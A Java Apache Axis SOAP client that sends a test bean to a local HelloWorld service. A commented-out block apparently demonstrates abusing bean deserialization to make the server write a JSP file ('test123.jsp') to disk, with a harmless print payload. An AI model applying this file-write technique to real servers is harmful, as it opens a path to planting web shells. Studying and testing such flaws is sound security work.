package client;

import example.HelloBean;
import example.TestBean;
import org.apache.axis.client.Call;
import org.apache.axis.client.Service;
import org.apache.axis.encoding.ser.BeanDeserializerFactory;
import org.apache.axis.encoding.ser.BeanSerializerFactory;

import javax.xml.namespace.QName;
import java.util.Date;

public class AxisClient {
    public static void main(String[] args) {
        try {
            String endpoint =
                    "http://localhost:8080/axis/services/HelloWorld?wsdl";

            Service service = new Service();
            Call call = (Call) service.createCall();

            call.setTargetEndpointAddress(new java.net.URL(endpoint));
            QName opQname = new QName("http://example", "sayHelloWorldFrom");
            call.setOperationName(opQname);

            QName helloBeanQname = new QName("urn:HelloBeanManager", "HelloBean");
            call.registerTypeMapping(HelloBean.class, helloBeanQname, new BeanSerializerFactory(HelloBean.class, helloBeanQname), new BeanDeserializerFactory(HelloBean.class, helloBeanQname));

            QName testBeanQname = new QName("urn:TestBeanManager", "TestBean");
            call.registerTypeMapping(TestBean.class, testBeanQname, new BeanSerializerFactory(TestBean.class, testBeanQname), new BeanDeserializerFactory(TestBean.class, testBeanQname));

            HelloBean helloBean = new HelloBean();
            helloBean.setStr("aaa");
            helloBean.setAnInt(111);
            helloBean.setBytes(new byte[]{1, 2, 3});
            helloBean.setDate(new Date(2021, 2, 12));
            helloBean.setTestBean(new TestBean("aaa", 111));
            String ret = (String) call.invoke(new Object[]{helloBean});

            System.out.println("Sent 'Hello!', got '" + ret + "'");


//            String endpoint =
//                    "http://localhost:8080/axis/services/HelloWorld?wsdl";
//
//            Service service = new Service();
//            Call call = (Call) service.createCall();
//
//            call.setTargetEndpointAddress(new java.net.URL(endpoint));
//            QName opQname = new QName("http://example", "saveFile");
//            call.setOperationName(opQname);
//
//            QName fileQname = new QName("urn:FileOutputStreamBeanManager", "FileOutputStream");
//            call.registerTypeMapping(FileOutputStream.class, fileQname, new BeanSerializerFactory(FileOutputStream.class, fileQname), new BeanDeserializerFactory(FileOutputStream.class, fileQname));
//
//            QName fileChannelQname = new QName("urn:FileChannelBeanManager", "FileChannel");
//            call.registerTypeMapping(FileChannel.class, fileChannelQname, new BeanSerializerFactory(FileChannel.class, fileChannelQname), new BeanDeserializerFactory(FileChannel.class, fileChannelQname));
//
//            QName fileDescriptorQname = new QName("urn:FileDescriptorBeanManager", "FileDescriptor");
//            call.registerTypeMapping(FileDescriptor.class, fileDescriptorQname, new BeanSerializerFactory(FileDescriptor.class, fileDescriptorQname), new BeanDeserializerFactory(FileDescriptor.class, fileDescriptorQname));
//
//            Object ret = call.invoke(new Object[]{new FileOutputStream("test123.jsp"), "<% out.println(\"test123\"); %>".getBytes()});
//
//            System.out.println(ret);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
